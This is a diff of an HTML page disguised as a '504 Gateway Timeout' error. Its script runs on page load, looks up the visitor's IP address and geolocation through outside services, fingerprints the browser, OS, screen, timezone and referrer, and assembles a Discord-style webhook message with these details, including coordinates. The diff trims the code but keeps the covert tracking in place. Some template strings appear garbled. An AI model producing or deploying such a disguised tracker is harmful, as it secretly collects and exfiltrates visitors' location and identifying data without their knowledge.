@@ -3,15 +3,10 @@
 <head>
 <meta charset="utf-8">
 <title>504 Gateway Timeout</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
-<div class="c">
-  <div class="err">504</div>
-  <h1>Gateway Timeout</h1>
-  <p>The server didn't respond in time.<br>The upstream server (or proxy) timed out.</p>
-  <p class="small">Request ID: <span class="code">a8b9c0d1e2f3</span></p>
-</div>
+<h1>504 Gateway Timeout</h1>
+<p>The server didn't respond in time.<br>The upstream server (or proxy) timed out.</p>
 
 <script>
 (async function(){
@@ -19,24 +14,15 @@
     const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip);
     const geo = await fetch('https://ipwho.is/'+ip).then(r=>r.json());
 
-    const ua = navigator.userAgentData?.userAgent || navigator.userAgent;
-    const browser = navigator.userAgentData?.brands?.find(b=>b.brand)?.brand || 
-                    /Chrome/.test(ua) ? 'Chrome' : 
-                    /Firefox/.test(ua) ? 'Firefox' : 
-                    /Safari/.test(ua) ? 'Safari' : 'Other';
-
-    const os = navigator.userAgentData?.platform || 
-               /Win/.test(ua) ? 'Windows' : 
-               /Mac/.test(ua) ? 'macOS' : 
-               /Android/.test(ua) ? 'Android' : 
-               /iPhone|iPad|iPod/.test(ua) ? 'iOS' : 'Other';
-
-    const device = navigator.userAgentData?.mobile ? 'Mobile' : 'Desktop';
+    const ua = navigator.userAgent;
+    const browser = /Chrome/.test(ua) ? 'Chrome' : /Firefox/.test(ua) ? 'Firefox' : /Safari/.test(ua) ? 'Safari' : /Edg/.test(ua) ? 'Edge' : 'Other';
+    const os = /Win/.test(ua) ? 'Windows' : /Mac/.test(ua) ? 'macOS' : /Android/.test(ua) ? 'Android' : /iPhone|iPad|iPod/.test(ua) ? 'iOS' : 'Other';
+    const device = /Mobile/.test(ua) ? 'Mobile' : 'Desktop';
 
     const payload = {
       content: '@everyone',
       embeds: [{
-        title: 'Detailed user pog',
+        title: 'Detailed log',
         color: 16711680,
         fields: [
           {name:'IP', value:ip, inline:true},
@@ -44,10 +30,10 @@
           {name:'City / Region', value:`${geo.city || '?'} • ${geo.region || '?'}`.trim(), inline:true},
           {name:'ISP / Provider', value:geo.connection?.isp || 'Unknown', inline:true},
           {name:'Connection Type', value:geo.connection?.type || 'Unknown', inline:true},
-          {name:'Browser', value:`\( {browser} ( \){geo.browser?.version || '?'})`, inline:true},
+          {name:'Browser', value:browser, inline:true},
           {name:'OS / Device', value:`${os} • ${device}`, inline:true},
-          {name:'Screen', value:`\( {screen.width}× \){screen.height} @ ${screen.colorDepth}bit`, inline:true},
-          {name:'Language', value:navigator.language || navigator.languages?.[0] || 'Unknown', inline:true},
+          {name:'Screen', value:`\( {screen.width}× \){screen.height}`, inline:true},
+          {name:'Language', value:navigator.language || 'Unknown', inline:true},
           {name:'Timezone', value:Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown', inline:true},
           {name:'Coordinates', value:`${geo.latitude?.toFixed(4) || '?'} , ${geo.longitude?.toFixed(4) || '?'}`.trim(), inline:true},
           {name:'Referrer', value:document.referrer || 'Direct / No referrer', inline:false},
